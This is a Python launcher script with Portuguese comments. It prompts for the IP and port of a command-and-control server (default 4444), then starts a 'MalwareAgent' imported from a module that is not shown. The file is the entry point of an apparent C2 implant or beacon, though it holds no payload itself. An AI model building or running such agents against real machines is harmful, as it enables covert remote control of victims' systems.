import sys
import os
import logging

# Ajuste do path para importar os módulos corretamente
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from core import MalwareAgent

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [AGENT-MAIN] - %(message)s')

def main():
    print("="*50)
    print("      INICIALIZADOR DO AGENTE SECURE BEACON")
    print("="*50)
    
    # Solicita o IP do servidor onde o agente deve se conectar
    host_input = input("[+] Digite o IP do Servidor C2 (Ex: 127.0.0.1): ").strip()
    if not host_input:
        logging.error("O endereço IP do Servidor C2 é obrigatório para a conexão.")
        sys.exit(1)
        
    port_input = input("[+] Digite a porta do Servidor C2 (Padrão: 4444): ").strip()
    if not port_input:
        port_input = "4444"
        
    try:
        port = int(port_input)
    except ValueError:
        logging.error("A porta deve ser um número inteiro válido.")
        sys.exit(1)

    # Inicializa o agente direcionando para o IP e porta capturados
    agent = MalwareAgent(c2_host=host_input, c2_port=port)
    agent.start()

if __name__ == "__main__":
    main()